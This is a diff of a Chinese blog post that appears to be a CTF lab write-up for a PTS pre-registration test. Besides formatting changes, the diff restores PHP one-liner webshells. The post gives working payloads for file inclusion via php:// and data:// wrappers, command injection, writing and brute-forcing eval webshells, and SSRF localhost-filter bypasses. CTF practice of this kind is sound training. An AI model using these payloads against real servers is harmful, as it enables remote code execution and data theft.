@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='PTS, CTF, 证书' /><meta itemprop="name" content="PTS 谷安预报名测试">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-02-28T23:24:57+08:00" />
 <meta itemprop="dateModified" content="2023-02-28T23:24:57+08:00" />
-<meta itemprop="wordCount" content="1209">
+<meta itemprop="wordCount" content="1338">
 <meta itemprop="keywords" content="PTS,CTF,证书," /><meta property="og:title" content="PTS 谷安预报名测试" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95\/"
-    },"genre": "posts","keywords": "PTS, CTF, 证书","wordcount":  1209 ,
+    },"genre": "posts","keywords": "PTS, CTF, 证书","wordcount":  1338 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95\/","datePublished": "2023-02-28T23:24:57+08:00","dateModified": "2023-02-28T23:24:57+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2023-02-28&#32;23:24:57><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-28">2023-02-28</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1209 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 3 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2023-02-28&#32;23:24:57><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-28">2023-02-28</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1338 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 3 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -222,19 +222,45 @@
 <p>请以get方式提交a=1 post方式提交b=2给服务器</p>
 </blockquote>
 <p>Poc:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?a=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?a=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">118.195.198.108:9997</span>
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">3</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">b=2
-</span></span></code></pre></div><p>返回key，<code>key1:T0kS7r3c</code></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回key，<code>key1:T0kS7r3c</code></p>
 <h2 id="2include">2、include</h2>
 <p>题目链接：http://118.195.198.108:9998/</p>
 <blockquote>
 <p>💡Hint:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
@@ -243,24 +269,73 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1">//}
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div></blockquote>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
 <p>利用点就是<code>include($page);</code>，注释中提示了<code>php://</code>伪协议</p>
 <p>Poc:</p>
-<pre tabindex="0"><code>?hello=&amp;page=php://filter/read=convert.base64-encode/resource=flag.php 
-?hello=&amp;page=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;
-</code></pre><p>考点：文件包含漏洞，伪协议</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?hello=&amp;page=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?hello=&amp;page=php://filter/read=convert.base64-encode/resource=flag.php 
+</span></span><span class="line"><span class="cl">?hello=&amp;page=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>考点：文件包含漏洞，伪协议</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?hello=&amp;page=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">118.195.198.108:9998</span>
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">31</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">&lt;?php system(&#39;cat flag.php&#39;);?&gt;
-</span></span></code></pre></div><h2 id="3hacked-by-alphabug">3、Hacked by Alphabug</h2>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3hacked-by-alphabug">3、Hacked by Alphabug</h2>
 <p>题目链接：http://118.195.198.108:9999/</p>
 <blockquote>
 <p>💡 Hint:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">0</span> <span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">0</span> <span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">#Hacked by Alphabug 
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl">    <span class="cm">/*
@@ -282,52 +357,134 @@
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">IP : xxxxxx
-</span></span></span></code></pre></div></blockquote>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
 <p><code>md5(&quot;M0rk&quot; . $_SERVER['REMOTE_ADDR'])</code>算出自己的sandbox地址。</p>
 <p>通过<code>cmd</code>进行写shell，为了及时发现自己的错误，可以先写txt，再通过cp命令转成php</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="k">echo</span><span class="o">+</span><span class="s1">&#39;&lt;?php&#39;</span><span class="o">&gt;&gt;</span><span class="nx">i</span><span class="o">.</span><span class="nx">txt</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="k">echo</span><span class="o">+</span><span class="s1">&#39;&lt;?php&#39;</span><span class="o">&gt;&gt;</span><span class="nx">i</span><span class="o">.</span><span class="nx">txt</span>
 </span></span><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="k">echo</span><span class="o">+</span><span class="s1">&#39;$a=$_POST[&#34;a&#34;];&#39;</span><span class="o">&gt;&gt;</span><span class="nx">i</span><span class="o">.</span><span class="nx">txt</span>
 </span></span><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="k">echo</span><span class="o">+</span><span class="s1">&#39;eval($a);&#39;</span><span class="o">&gt;&gt;</span><span class="nx">i</span><span class="o">.</span><span class="nx">txt</span>
 </span></span><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">cp</span><span class="o">+</span><span class="nx">i</span><span class="o">.</span><span class="nx">txt</span><span class="o">+</span><span class="nx">i</span><span class="o">.</span><span class="nx">php</span>
-</span></span></code></pre></div><p>连接shell，获取flag</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接shell，获取flag</p>
 <h2 id="4密码是什么呢">4、密码是什么呢？</h2>
 <blockquote>
 <p>💡Hint</p>
 <p>密码是什么呢？</p>
-<!-- raw HTML omitted -->
+<?php @eval($_POST['?']);?>
 </blockquote>
 <p>暴破一句话木马的连接密码</p>
 <p>PHP一句话可以执行PHP命令，为了方便暴破，我们可以使用PHP echo输出内容，改变响应包的大小来做区分。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">118.195.198.108:20001</span>
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
 </span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">20</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">cmd=echo 123456789;
-</span></span></code></pre></div><p>对cmd参数加标记，进行暴破，观察响应包大小变化，最后变化的就是密码，密码为pass</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对cmd参数加标记，进行暴破，观察响应包大小变化，最后变化的就是密码，密码为pass</p>
 <p>进行命令控制，读取flag</p>
-<pre tabindex="0"><code>pass=echo `ls`;
-pass=echo `cat 3daddreEt30Nx.txt`;
-</code></pre><h2 id="5var_dump">5、var_dump</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">pass</span><span class="o">=</span><span class="n">echo</span><span class="w"> </span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">pass</span><span class="o">=</span><span class="n">echo</span><span class="w"> </span><span class="o">`</span><span class="n">cat</span><span class="w"> </span><span class="mi">3</span><span class="n">daddreEt30Nx</span><span class="p">.</span><span class="n">txt</span><span class="o">`</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5var_dump">5、var_dump</h2>
 <blockquote>
 <p>💡Hint</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Warning</span><span class="o">:</span> <span class="nx">var_dump</span><span class="p">()</span> <span class="nx">expects</span> <span class="nx">at</span> <span class="nx">least</span> <span class="mi">1</span> <span class="nx">parameter</span><span class="p">,</span> <span class="mi">0</span> <span class="nx">given</span> <span class="nx">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">:</span> <span class="k">eval</span><span class="p">()</span><span class="s1">&#39;d code on line 1
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Warning</span><span class="o">:</span> <span class="nx">var_dump</span><span class="p">()</span> <span class="nx">expects</span> <span class="nx">at</span> <span class="nx">least</span> <span class="mi">1</span> <span class="nx">parameter</span><span class="p">,</span> <span class="mi">0</span> <span class="nx">given</span> <span class="nx">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">:</span> <span class="k">eval</span><span class="p">()</span><span class="s1">&#39;d code on line 1
 </span></span></span><span class="line"><span class="cl"><span class="s1">&lt;?php 
 </span></span></span><span class="line"><span class="cl"><span class="s1">    #error_reporting(0);
 </span></span></span><span class="line"><span class="cl"><span class="s1">    $a = @$_REQUEST[&#39;</span><span class="nx">hello</span><span class="err">&#39;</span><span class="p">];</span> 
 </span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span> <span class="s2">&#34;var_dump(</span><span class="si">$a</span><span class="s2">);&#34;</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl">    <span class="nx">show_source</span> <span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
-</span></span></span></code></pre></div></blockquote>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
 <p>命令注入，闭合<code>var_dump</code></p>
 <p>POC：</p>
-<pre tabindex="0"><code>/?hello=);echo`ls`;//
-/?hello=);echo`cat x8kwjkzp1ik.txt`;//
-</code></pre><h2 id="6curl_exec">6、curl_exec</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/?</span><span class="n">hello</span><span class="o">=</span><span class="p">);</span><span class="n">echo</span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="p">;</span><span class="o">//</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/?</span><span class="n">hello</span><span class="o">=</span><span class="p">);</span><span class="n">echo</span><span class="o">`</span><span class="n">cat</span><span class="w"> </span><span class="n">x8kwjkzp1ik</span><span class="p">.</span><span class="n">txt</span><span class="o">`</span><span class="p">;</span><span class="o">//</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="6curl_exec">6、curl_exec</h2>
 <blockquote>
 <p>💡Hint</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
@@ -351,33 +508,81 @@ pass=echo `cat 3daddreEt30Nx.txt`;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">//flag.php
-</span></span></span></code></pre></div></blockquote>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
 <p><code>url=http://xxxxxx/flag.php</code></p>
 <p>考点，对localhost、127.0.0.1的绕过</p>
-<pre tabindex="0"><code>127.0.0.1
-十进制整数：url=http://2130706433/flag.php
-十六进制：url=http://0x7F.0.0.1/flag.php
-八进制：url=http://0177.0.0.1/flag.php
-十六进制整数：url=http://0x7F000001/flag.php
-缺省模式：127.0.0.1写成127.1
-CIDR：url=http://127.127.127.127/flag.php
-url=http://0/flag.php
-url=http://0.0.0.0/flag.php
-</code></pre><p>经过尝试，只有如下成功绕过，其他会造成400报错</p>
-<pre tabindex="0"><code>url=http://127.127.127.127/flag.php
-url=http://0x7F000001/flag.php
-url=http://0.0.0.0/flag.php
-</code></pre><h2 id="7你真的会使用webshell吗">7、你真的会使用webshell吗？</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1
+</span></span><span class="line"><span class="cl">十进制整数：url=http://2130706433/flag.php
+</span></span><span class="line"><span class="cl">十六进制：url=http://0x7F.0.0.1/flag.php
+</span></span><span class="line"><span class="cl">八进制：url=http://0177.0.0.1/flag.php
+</span></span><span class="line"><span class="cl">十六进制整数：url=http://0x7F000001/flag.php
+</span></span><span class="line"><span class="cl">缺省模式：127.0.0.1写成127.1
+</span></span><span class="line"><span class="cl">CIDR：url=http://127.127.127.127/flag.php
+</span></span><span class="line"><span class="cl">url=http://0/flag.php
+</span></span><span class="line"><span class="cl">url=http://0.0.0.0/flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过尝试，只有如下成功绕过，其他会造成400报错</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.127.127.127/flag.php
+</span></span><span class="line"><span class="cl">url=http://0x7F000001/flag.php
+</span></span><span class="line"><span class="cl">url=http://0.0.0.0/flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="7你真的会使用webshell吗">7、你真的会使用webshell吗？</h2>
 <blockquote>
 <p>💡Hint</p>
 <p>你真的会使用webshell吗？</p>
-<!-- raw HTML omitted -->
+<?php @eval($_POST['cmd']);?>
 </blockquote>
 <p>不会</p>
 <h2 id="8hello-english">8、Hello English</h2>
 <blockquote>
 <p>💡Hint</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="s1">&#39;On&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
@@ -395,11 +600,21 @@ url=http://0.0.0.0/flag.php
 </span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$x</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div></blockquote>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
 <p>Poc:</p>
-<pre tabindex="0"><code>Cookie: language=data:text/plain,&lt;?php phpinfo()%3b?&gt;
-Cookie: language=php://filter/read=convert.base64-encode/resource=./flag
-</code></pre></div><div class="post-footer" id="post-footer">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: language=data:text/plain,&lt;?php phpinfo()%3b?&gt;
+</span></span><span class="line"><span class="cl">Cookie: language=php://filter/read=convert.base64-encode/resource=./flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
